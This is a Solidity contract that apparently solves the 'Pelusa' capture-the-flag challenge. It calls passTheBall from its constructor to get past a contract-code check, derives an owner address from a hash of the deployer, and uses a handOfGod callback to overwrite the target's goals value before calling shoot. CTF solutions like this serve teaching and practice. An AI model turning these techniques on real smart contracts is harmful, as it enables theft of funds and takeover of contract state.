// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";



contract attack_pelusa is IGame{
    address public owner;
    uint256 public goals;
    Pelusa public pelusacontract;

    constructor (address _pelusacontractaddress) {
        pelusacontract = Pelusa(_pelusacontractaddress);
        pelusacontract.passTheBall();
    }

    function getBallPossesion () external view returns (address){
        return owner;
    }

    function handOfGod() external returns(uint256){
        goals = 2;
        return 22_06_1986;
    }

    function attackpelusa(address _contractdeployer) external {
    owner = address(uint160(uint256(keccak256(abi.encodePacked(_contractdeployer, bytes32(uint256(0)))))));
    pelusacontract.shoot();
    }
}